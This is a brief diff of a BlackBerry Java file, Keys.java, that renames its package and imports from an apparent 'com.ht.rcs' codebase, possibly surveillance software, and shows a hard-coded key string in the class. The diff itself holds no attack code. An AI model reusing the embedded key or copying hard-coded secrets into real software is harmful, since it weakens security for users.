@@ -5,12 +5,12 @@
  * File         : Keys.java 
  * Created      : 26-mar-2010
  * *************************************************/
-package com.ht.rcs.blackberry.config;
+package blackberry.config;
 
 import net.rim.device.api.system.GPRSInfo;
-import com.ht.rcs.blackberry.crypto.Encryption;
-import com.ht.rcs.blackberry.interfaces.Singleton;
-import com.ht.rcs.blackberry.utils.Utils;
+import blackberry.crypto.Encryption;
+import blackberry.interfaces.Singleton;
+import blackberry.utils.Utils;
 
 public class Keys implements Singleton {
     private static String conf = "Adf5V57gQtyi90wUhpb8Neg56756j87R";
